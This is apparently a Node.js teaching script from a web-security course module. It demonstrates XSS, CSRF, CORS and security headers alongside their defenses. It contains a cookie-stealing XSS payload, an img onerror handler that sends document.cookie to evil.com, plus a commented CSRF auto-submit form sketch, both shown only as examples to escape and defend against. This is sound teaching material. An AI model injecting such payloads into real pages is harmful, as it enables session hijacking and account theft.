/**
 * Module 10 — 10.11 Web Attacks: XSS, CSRF, CORS, CSP & Security Headers
 * Simulates the attacks plus the defenses so you can explain them out loud.
 *
 * Run: node 11-web-attacks.js
 */

console.log("--- XSS (Cross-Site Scripting) ---");
// Reflected/stored/DOM injection: attacker's script runs with YOUR origin's powers
const userComment = "<img src=x onerror=\"fetch('//evil.com/steal?c='+document.cookie)\">";
const safeEscape = (html) => html.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

console.log("raw render  :", userComment); // browser would execute the onerror handler!
console.log("escaped     :", safeEscape(userComment));
// Defenses: escape output, sanitize, CSP script-src, HttpOnly cookies, no innerHTML with user data

console.log("\n--- CSRF (Cross-Site Request Forgery) ---");
// Attacker's page FORCES the victim's browser to send an authenticated request to your site
// attack      : <form action='https://bank.com/transfer' method=POST>...<img src=... onload='form.submit()'>
// why it works: cookies auto-attach to the request — the server thinks the USER sent it
console.log("cookies auto-attach cross-site, so the request looks authenticated");

const sameSite = { Strict: "cookie never sent cross-site", Lax: "cookie sent on top-level GET navigations only" };
console.log("defense 1   : SameSite=" + Object.entries(sameSite).map(([k, v]) => `${k} → ${v}`).join(" | "));
// defense 2: CSRF token — server-issued secret in a hidden field/header, checked per request
// defense 3: verify Origin/Referer header
// best      : SameSite=Strict cookies + CSRF tokens; JWTs in memory avoid the whole class

console.log("\n--- CORS (cross-origin resource sharing) ---");
// PITFALL: CORS is a BROWSER enforcement tool, not a server security wall.
// curl/scripts/WS are not blocked; it only stops YOUR page from READING the response.
const corsDemo = (origin) => {
  const allowed = ["https://my-app.com"];
  if (allowed.includes(origin)) return { "Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true" };
  return {}; // browser forbids reading the response
};
console.log("my-app.com  ->", corsDemo("https://my-app.com")["Access-Control-Allow-Origin"] ?? "no CORS header — response unreadable");
console.log("evil.com    ->", corsDemo("https://evil.com")["Access-Control-Allow-Origin"] ?? "no CORS header — response unreadable");
// never: Access-Control-Allow-Origin: * with credentials (browser rejects anyway)

console.log("\n--- Essential response headers ---");
const headers = [
  ["Content-Security-Policy", "script-src 'self'", "blocks inline/injected scripts (XSS) + data: URIs"],
  ["Strict-Transport-Security", "max-age=31536000", "forces HTTPS only (HSTS)"],
  ["X-Content-Type-Options", "nosniff", "prevents MIME-sniffing attacks"],
  ["X-Frame-Options", "DENY", "clickjacking — blocks framing your page"],
  ["Referrer-Policy", "no-referrer", "don't leak the URL in Referer to third parties"],
];
for (const [name, value, why] of headers) console.log(`${name.padEnd(28)} ${value.padEnd(22)} ${why}`);

console.log("\n--- Extra hygiene ---");
// rate limiting / lockout -> slow credential stuffing & brute force
// never roll your own crypto; keep secrets out of the client entirely
// JWT gotchas: sig-stripping (pin algorithm), disclosure of alg:none / HS256-leak from public key
console.log("attack surface summary above — defenses are the comments");